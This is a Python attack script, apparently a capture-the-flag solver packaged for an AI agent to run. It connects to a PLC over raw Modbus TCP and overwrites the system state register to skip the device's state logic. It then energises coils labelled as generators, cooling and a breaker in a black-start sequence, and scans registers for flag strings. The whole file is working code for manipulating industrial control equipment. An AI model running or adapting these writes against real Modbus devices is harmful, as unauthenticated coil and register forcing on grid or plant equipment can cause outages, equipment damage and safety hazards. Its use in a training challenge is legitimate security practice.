#!/usr/bin/env python3
"""
modbus_blackstart_runner.py — Sequential Coil State-Machine Runner (AI-Ready)

Usage:
  # Standard 4-coil black start (GenA→Cooling→GenB→Breaker):
  python3 modbus_blackstart_runner.py --ip 192.168.1.21 --sequence 0,2,1,3 --state-reg 0 --init-state 2 --json

  # Custom sequence with coil labels:
  python3 modbus_blackstart_runner.py --ip 192.168.1.21 --sequence 0,2,1,3 \
    --labels "GenA,Cooling,GenB,Breaker" --state-reg 0 --init-state 2 --json

  # Dry-run (no writes, just show plan):
  python3 modbus_blackstart_runner.py --ip 192.168.1.21 --sequence 0,2,1,3 --dry-run --json
"""
import argparse
import json
import re
import socket
import struct
import time
import base64
import sys
from typing import List, Optional, Dict, Any

STATE_NAMES: Dict[int, str] = {
    0: "OFF", 1: "LOCKED", 2: "INITIALIZING",
    3: "PARTIAL", 4: "OPERATIONAL", 5: "UNSTABLE"
}
FLAG_RE = re.compile(
    rb'(?:coc2026|flag|f1ag|fl4g|ctf|rtaf)\{[^}]{4,100}\}',
    re.IGNORECASE
)


def _state_name(v: int) -> str:
    return STATE_NAMES.get(v, f"UNKNOWN({v})")


class ModbusSession:
    """Single persistent TCP session — required for stateful challenges."""

    def __init__(self, host: str, port: int, unit: int, timeout: float = 10.0, iface: Optional[str] = None):
        self.host = host
        self.port = port
        self.unit = unit
        self.timeout = timeout
        self.iface = iface
        self._tid = 0
        self._sock: Optional[socket.socket] = None

    def connect(self) -> bool:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(self.timeout)
        if self.iface:
            s.setsockopt(socket.SOL_SOCKET, 25, (self.iface + '\0').encode())
        try:
            s.connect((self.host, self.port))
            self._sock = s
            return True
        except Exception:
            return False

    def close(self):
        if self._sock:
            try:
                self._sock.close()
            except Exception:
                pass
            self._sock = None

    def _xact(self, req: bytes) -> bytes:
        assert self._sock is not None, "Not connected"
        self._sock.send(req)
        return self._sock.recv(4096)

    def _tid_next(self) -> int:
        self._tid = (self._tid + 1) & 0xFFFF
        return self._tid

    def read_hr(self, addr: int, count: int) -> Optional[List[int]]:
        tid = self._tid_next()
        req = struct.pack('>HHHBBHH', tid, 0, 6, self.unit, 3, addr, count)
        try:
            r = self._xact(req)
            if len(r) > 9 and r[7] == 3:
                nb = r[8]
                return [struct.unpack('>H', r[9 + i:11 + i])[0] for i in range(0, nb, 2)]
        except Exception:
            pass
        return None

    def read_coils(self, addr: int, count: int) -> Optional[List[int]]:
        tid = self._tid_next()
        req = struct.pack('>HHHBBHH', tid, 0, 6, self.unit, 1, addr, count)
        try:
            r = self._xact(req)
            if len(r) > 9 and r[7] == 1:
                nb = r[8]
                bits: List[int] = []
                for i in range(nb):
                    byte = r[9 + i]
                    for b in range(8):
                        bits.append((byte >> b) & 1)
                return bits[:count]
        except Exception:
            pass
        return None

    def write_coil(self, addr: int, val: bool) -> bool:
        tid = self._tid_next()
        v = 0xFF00 if val else 0x0000
        req = struct.pack('>HHHBBHH', tid, 0, 6, self.unit, 5, addr, v)
        try:
            r = self._xact(req)
            return len(r) > 7 and r[7] == 5
        except Exception:
            return False

    def write_hr_fc6(self, addr: int, val: int) -> bool:
        tid = self._tid_next()
        req = struct.pack('>HHHBBHH', tid, 0, 6, self.unit, 6, addr, val)
        try:
            r = self._xact(req)
            return len(r) > 7 and r[7] == 6
        except Exception:
            return False

    def write_hr_fc16(self, addr: int, values: List[int]) -> bool:
        tid = self._tid_next()
        n = len(values)
        data = struct.pack('>HHB', addr, n, n * 2)
        for v in values:
            data += struct.pack('>H', v)
        req = struct.pack('>HHHBB', tid, 0, len(data) + 2, self.unit, 16) + data
        try:
            r = self._xact(req)
            return len(r) > 7 and r[7] == 16
        except Exception:
            return False


def _decode_flag_regs(regs: List[int]) -> Optional[str]:
    raw = b''.join(struct.pack('>H', v) for v in regs).rstrip(b'\x00')
    # Direct regex
    for m in FLAG_RE.finditer(raw):
        return m.group(0).decode('utf-8', errors='ignore')
    # Base64 → Hex chain
    try:
        blob_str = raw.decode('utf-8', errors='ignore').strip()
        b64_matches = re.findall(r'[A-Za-z0-9+/]{20,}={0,2}', blob_str)
        for bc in b64_matches:
            try:
                step2 = base64.b64decode(bc + '==')
                step2_str = step2.decode('ascii', errors='strict').strip()
                if re.fullmatch(r'[0-9a-fA-F]+', step2_str) and len(step2_str) % 2 == 0:
                    step3 = bytes.fromhex(step2_str)
                    for m in FLAG_RE.finditer(step3):
                        return m.group(0).decode('utf-8', errors='ignore')
            except Exception:
                pass
    except Exception:
        pass
    return None


def _scan_for_flags(sess: ModbusSession, scan_ranges: List[int]) -> Optional[str]:
    for start in scan_ranges:
        regs = sess.read_hr(start, 60)
        if regs and any(v != 0 for v in regs):
            flag = _decode_flag_regs(regs)
            if flag:
                return flag
    return None


def main() -> None:
    p = argparse.ArgumentParser(description="Modbus Black Start Sequential Coil Runner (AI-Ready)")
    p.add_argument("--ip", required=True)
    p.add_argument("--port", type=int, default=502)
    p.add_argument("--unit", type=int, default=0)
    p.add_argument("--timeout", type=float, default=10.0)
    p.add_argument("--iface", default=None, help="Network interface (e.g. eth1)")
    p.add_argument("--sequence", required=True,
                   help="Comma-separated coil IDs in startup order, e.g. 0,2,1,3")
    p.add_argument("--labels", default=None,
                   help="Comma-separated names matching --sequence, e.g. GenA,Cooling,GenB,Breaker")
    p.add_argument("--state-reg", type=int, default=0,
                   help="HR address of system state register (default: 0)")
    p.add_argument("--init-state", type=int, default=None,
                   help="Force this state value via FC06 before sequence (e.g. 2=INITIALIZING)")
    p.add_argument("--reset-coils", action="store_true",
                   help="Set all sequence coils to 0 before starting")
    p.add_argument("--step-delay", type=float, default=0.5,
                   help="Seconds to wait after each coil write (default: 0.5)")
    p.add_argument("--scan-ranges", default="300,400,500,100,200,600,700",
                   help="HR start addresses to scan for flags after sequence (default: 300,400,500,...)")
    p.add_argument("--abort-on-locked", action="store_true",
                   help="Abort immediately if state becomes LOCKED (1) after a write")
    p.add_argument("--dry-run", action="store_true",
                   help="Print plan without executing any writes")
    p.add_argument("--json", action="store_true", help="Output pure JSON for AI")
    args = p.parse_args()

    coil_seq = [int(x.strip()) for x in args.sequence.split(',')]
    labels = [x.strip() for x in args.labels.split(',')] if args.labels else [f"coil_{c}" for c in coil_seq]
    scan_ranges = [int(x.strip()) for x in args.scan_ranges.split(',')]

    report: Dict[str, Any] = {
        "target": f"{args.ip}:{args.port}",
        "unit": args.unit,
        "sequence": coil_seq,
        "labels": labels,
        "dry_run": args.dry_run,
        "steps": [],
        "flag": None,
        "flag_location": None,
        "status": "pending",
        "error": None,
    }

    if args.dry_run:
        report["status"] = "dry_run"
        report["plan"] = [{"step": i + 1, "coil": c, "label": l} for i, (c, l) in enumerate(zip(coil_seq, labels))]
        if args.json:
            print(json.dumps(report, indent=2))
        else:
            print("[DRY-RUN] Black Start Plan:")
            if args.init_state is not None:
                print(f"  0. FC06 HR[{args.state_reg}] = {args.init_state} ({_state_name(args.init_state)})")
            for step in report["plan"]:
                print(f"  {step['step']}. FC05 coil {step['coil']} = ON  ({step['label']})")
        sys.exit(0)

    sess = ModbusSession(args.ip, args.port, args.unit, args.timeout, args.iface)
    if not sess.connect():
        report["status"] = "connection_failed"
        report["error"] = f"Cannot connect to {args.ip}:{args.port}"
        print(json.dumps(report, indent=2) if args.json else f"[ERROR] {report['error']}")
        sys.exit(1)

    try:
        # Phase 0: Reset coils
        if args.reset_coils:
            for c in reversed(coil_seq):
                sess.write_coil(c, False)
                time.sleep(0.2)
            time.sleep(0.3)

        # Phase 1: Force init state
        if args.init_state is not None:
            sess.write_hr_fc6(args.state_reg, args.init_state)
            time.sleep(0.3)
            hr = sess.read_hr(args.state_reg, 1)
            forced_state = hr[0] if hr else -1
            report["forced_state"] = {"value": forced_state, "name": _state_name(forced_state)}

        # Phase 2: Execute sequence
        aborted = False
        for i, (coil_id, label) in enumerate(zip(coil_seq, labels)):
            ok = sess.write_coil(coil_id, True)
            time.sleep(args.step_delay)
            hr = sess.read_hr(args.state_reg, 1)
            coils = sess.read_coils(0, max(coil_seq) + 1) or []
            state_val = hr[0] if hr else -1
            step_result = {
                "step": i + 1,
                "coil": coil_id,
                "label": label,
                "write_ok": ok,
                "state_after": state_val,
                "state_name": _state_name(state_val),
                "coils_snapshot": coils,
            }
            report["steps"].append(step_result)
            if not args.json:
                print(f"  [{i+1}] coil {coil_id} ({label}) → {'OK' if ok else 'FAIL'} | state={state_val} ({_state_name(state_val)})")
            if args.abort_on_locked and state_val == 1:
                report["status"] = "aborted_locked"
                aborted = True
                break

        # Phase 3: Scan for flag
        if not aborted:
            flag = _scan_for_flags(sess, scan_ranges)
            if flag:
                report["flag"] = flag
                report["status"] = "flag_found"
                if not args.json:
                    print(f"\n[FLAG] {flag}")
                    print(f"[CLEAN] {flag}")
                    print(f"[METHOD] FC06 HR[{args.state_reg}]={args.init_state} → FC05 sequence {coil_seq} → HR scan {scan_ranges}")
            else:
                report["status"] = "sequence_complete_no_flag"
                if not args.json:
                    print("[!] Sequence complete but no flag found in scanned ranges.")

    except Exception as e:
        report["status"] = "error"
        report["error"] = str(e)
    finally:
        sess.close()

    if args.json:
        print(json.dumps(report, indent=2))
    sys.exit(0 if report.get("flag") else 1)


if __name__ == "__main__":
    main()
